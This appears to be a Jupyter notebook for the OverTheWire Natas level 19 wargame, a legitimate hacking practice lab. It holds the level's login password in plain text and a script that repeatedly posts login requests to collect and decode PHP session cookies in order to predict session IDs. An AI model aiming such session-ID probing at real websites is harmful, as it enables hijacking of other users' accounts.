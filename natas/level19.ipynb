{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import json\n",
    "from requests.auth import HTTPBasicAuth\n",
    "import string\n",
    "import time\n",
    "from datetime import timedelta\n",
    "iter = 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "from itertools import pairwise\n",
    "\n",
    "\n",
    "auth = HTTPBasicAuth(username='natas19',password='tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')\n",
    "\n",
    "with open(f\"cookies_{iter}.txt\", \"a\") as f:\n",
    "    cookie = {\n",
    "        \"PHPSESSID\": \"0\"\n",
    "    }\n",
    "    for i in range(100):\n",
    "        data = {'username': \"admin\", \"password\": \"\"}\n",
    "        r = requests.post('http://natas19.natas.labs.overthewire.org', data=data, auth=auth, cookies=cookie)\n",
    "        c = r.cookies[\"PHPSESSID\"].split(\"d\")[0]\n",
    "        print([int(i+j)-30 for i,j in zip(c[::2], c[1::2])], file=f)\n",
    "iter += 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "31332d61646d696e616e\n"
     ]
    }
   ],
   "source": [
    "data = {'username': \"adminan\", \"password\": \"password\"}\n",
    "auth = HTTPBasicAuth(username='natas19',password='tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')\n",
    "\n",
    "r = requests.post('http://natas19.natas.labs.overthewire.org', data=data, auth=auth)\n",
    "print(r.cookies[\"PHPSESSID\"])\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
